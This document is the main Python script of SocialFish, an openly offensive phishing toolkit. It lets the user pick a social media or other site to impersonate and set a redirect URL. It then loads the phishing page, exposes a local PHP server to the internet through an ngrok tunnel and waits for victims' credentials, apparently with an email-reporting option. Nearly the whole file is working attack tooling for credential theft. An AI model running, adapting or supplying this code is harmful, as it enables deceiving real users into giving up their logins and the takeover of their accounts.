#!/usr/bin/env python3

######################################################
#                                                    #
#       SOCIALFISH v2.0sharkNet                      #
#                                                    #
# by:     UNDEADSEC                                  #
#                                                    #
# Telegram Group: https://t.me/UndeadSec             #
# YouTube Channel: https://youtube.com/c/UndeadSec   #
# Twitter: https://twitter.com/A1S0N_                #
#                                                    #
######################################################

from sys import exit, version_info

if version_info<(3,0,0):
    print('[!] Please use Python 3. $ python3 SocialFish.py')
    exit(0)

from multiprocessing import Process
from core.view import *
from core.pre import *
from core.phishingRunner import *
from core.sites import site
from smtplib import *

def main():
    head()
    checkEd()    
    try:
        checkmail()
    except (SMTPAuthenticationError,ValueError):
        print(red(' [!] Your authentication failed'))
    except IndexError:
        print(red(' [!] this domain is not supported'))
        
    social,others = cyan(' [{}{}\n\n'.format(bold((cyan('S'))),cyan(']ocial Media'))),cyan(' [{}{}\n\n'.format(bold((cyan('O'))),cyan(']thers')))
    preoption = input(cyan('\n Select an option\n\n') + social + others + cyan(' SF > '))

    while True:

        if preoption.upper() == 'S':
            print('')
            for x in range(1, 8):
                print(cyan(' [' + bold(cyan(str(x))) + cyan('] ' + site[str(x)])))
            while True:
                try:
                    option = input(cyan('\n SF > '))
                    if int(option) in range(1,8):
                        while True:
                            custom = input(cyan('\n Insert a custom redirect url: > '))
                            if not custom:
                                pass
                            else:
                                break
                    break
                except ValueError:
                    pass
            break


        elif preoption.upper() == 'O':       
            print('')
            for x in range(8, 12):
                print(cyan(' [' + bold(cyan(str(x))) + cyan('] ' + site[str(x)])))
            while True:
                try:
                    option = input(cyan('\n SF > '))
                    if int(option) in range(8,12):
                        while True:
                            custom = input(cyan('\n Insert a custom redirect url: > '))

                            if not custom:
                                pass
                            else:
                                break
                    break
                except ValueError:
                    pass
            break
        
        else:
            preoption = input(cyan(" SF > "))
    
    custom = 'http://' + custom if '://' not in custom else custom
    loadModule(site[option])
    runPhishing(site[option], custom)

if __name__ == "__main__":
    try:        
        system('pkill -f ngrok')
        system('pkill -f php')
        pre()
        main()
        runNgrok()
        Process(target=runServer).start()
        waitCreds()
    except KeyboardInterrupt:
        system('pkill -f ngrok')
        system('pkill -f php')
        end()
        exit(0)
    except SMTPSenderRefused:
        print(' [!] sorry, sender refused ;(')
        
